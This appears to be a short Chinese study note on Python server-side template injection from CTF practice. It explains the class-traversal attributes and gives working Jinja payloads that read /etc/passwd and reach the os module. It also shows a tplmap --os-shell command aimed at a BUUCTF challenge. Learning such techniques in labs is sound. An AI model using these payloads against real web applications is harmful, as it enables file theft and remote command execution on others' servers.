---

---
!![[image 9.png]]

> [!note]+ 在Python的SSTI中，大部分是依靠基类->子类->危险函数的方式来利用SSTI
> - **__class__**  返回类型所属的对象
> - **__mro__**    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。
> - **__base__**   返回该对象所继承的基类  // __base__和__mro__都是用来寻找基类的
> - **__subclasses__**   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
> - **__init__**  类的初始化方法
> - **__globals__**  对包含函数全局变量的字典的引用
> 

```javascript
利用溢出来实现查看全部的类
''.__class__.__mro__[2].__subclasses__()
```

```javascript
找到type file类型(可以进行文件读取)
{{ [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read() }}

```

```javascript
利用 <class 'site._Printer'>类型（可以进行命令执行）
{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
```

# **BUUCTF：[BJDCTF 2nd]fake google**

利用conda和tplmap来获取shell

```javascript
conda env -list
conda active py2env
python2 tplmap.py -u "http://e8852453-260e-4592-a87b-ec6dfb18b704.node5.buuoj.cn:81/qaq?name=123" --os-shell
```

!![[image 10.png]]

!![[image 11.png]]

## 正常的ssti注入

